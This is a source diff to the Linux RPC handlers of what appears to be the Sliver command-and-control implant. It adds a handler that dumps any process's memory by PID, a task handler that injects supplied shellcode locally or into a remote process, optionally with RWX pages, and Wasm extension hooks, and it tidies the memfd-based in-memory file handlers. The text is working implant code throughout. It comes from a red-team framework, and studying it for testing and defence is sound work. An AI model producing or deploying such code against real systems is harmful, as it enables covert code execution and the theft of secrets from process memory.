@@ -31,6 +31,7 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/bishopfox/sliver/implant/sliver/procdump"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
@@ -70,6 +71,11 @@ var (
 		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
 		sliverpb.MsgProcessDumpReq: dumpHandler,
 
+		// Wasm Extensions - Note that execution can be done via a tunnel handler
+		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
+		sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
+		sliverpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
+
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
 		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
@@ -96,6 +102,45 @@ func GetSystemHandlers() map[uint32]RPCHandler {
 	return linuxHandlers
 }
 
+func dumpHandler(data []byte, resp RPCResponse) {
+	procDumpReq := &sliverpb.ProcessDumpReq{}
+	err := proto.Unmarshal(data, procDumpReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	res, err := procdump.DumpProcess(procDumpReq.Pid)
+	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
+	if err != nil {
+		dumpResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+	}
+	data, err = proto.Marshal(dumpResp)
+	resp(data, err)
+}
+
+func taskHandler(data []byte, resp RPCResponse) {
+	var err error
+	task := &sliverpb.TaskReq{}
+	err = proto.Unmarshal(data, task)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	if task.Pid == 0 {
+		err = taskrunner.LocalTask(task.Data, task.RWXPages)
+	} else {
+		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
+	}
+	resp([]byte{}, err)
+}
+
 func getUid(fileInfo os.FileInfo) string {
 	uid := int32(fileInfo.Sys().(*syscall.Stat_t).Uid)
 	uid_str := strconv.FormatUint(uint64(uid), 10)
@@ -116,7 +161,7 @@ func getGid(fileInfo os.FileInfo) string {
 	return grp.Name
 }
 
-func memfilesListHandler(data []byte, resp RPCResponse) {
+func memfilesListHandler(_ []byte, resp RPCResponse) {
 
 	pid := os.Getpid()
 	path := fmt.Sprintf("/proc/%d/fd/", pid)
@@ -162,19 +207,17 @@ func memfilesListHandler(data []byte, resp RPCResponse) {
 	}
 
 	// Send back the response
-	data, err = proto.Marshal(dirList)
+	data, err := proto.Marshal(dirList)
 	resp(data, err)
-
 }
 
-func memfilesAddHandler(data []byte, resp RPCResponse) {
+func memfilesAddHandler(_ []byte, resp RPCResponse) {
 
 	var nrMemfdCreate int
 	memfilesAdd := &sliverpb.MemfilesAdd{}
 	memfilesAdd.Response = &commonpb.Response{}
 
 	memfdName := taskrunner.RandomString(8)
-	//memfdName := "/tmp/a"
 	memfd, err := syscall.BytePtrFromString(memfdName)
 	if err != nil {
 		//{{if .Config.Debug}}
@@ -191,11 +234,10 @@ func memfilesAddHandler(data []byte, resp RPCResponse) {
 
 	fd, _, _ := syscall.Syscall(uintptr(nrMemfdCreate), uintptr(unsafe.Pointer(memfd)), 1, 0)
 	fd_str := fmt.Sprintf("%d", fd)
-	fd_int, err := strconv.ParseInt(fd_str, 0, 64)
-	//log.Printf("Fd: %d\n", fd_int)
+	fd_int, _ := strconv.ParseInt(fd_str, 0, 64)
 	memfilesAdd.Fd = fd_int
 
-	data, err = proto.Marshal(memfilesAdd)
+	data, err := proto.Marshal(memfilesAdd)
 	resp(data, err)
 
 }
